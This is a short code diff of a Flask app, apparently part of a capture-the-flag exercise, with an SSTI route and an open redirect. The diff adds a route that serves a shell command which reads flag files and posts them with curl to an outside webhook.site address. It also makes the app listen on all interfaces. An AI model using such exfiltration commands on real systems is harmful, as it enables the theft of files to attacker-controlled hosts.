@@ -18,6 +18,10 @@ def get_index():
     print(flag.stream.read())
     return 'use static', 200
 
+@app.route('/a', methods=['GET'])
+def get_index():
+    return 'cat flag/*/* | curl -X POST --data-binary @- https://webhook.site/3ac78532-8d8b-4257-8593-3ee232134985', 200
+
 @app.route('/redirect')
 def redirect_page():
     url = request.args.get('url', None)
@@ -52,5 +56,5 @@ def ssti():
     return render_template_string(contents)
 
 if __name__ == '__main__':
-    app.run(host='127.0.0.1', port=5000)
+    app.run(host='0.0.0.0', port=5000)
     
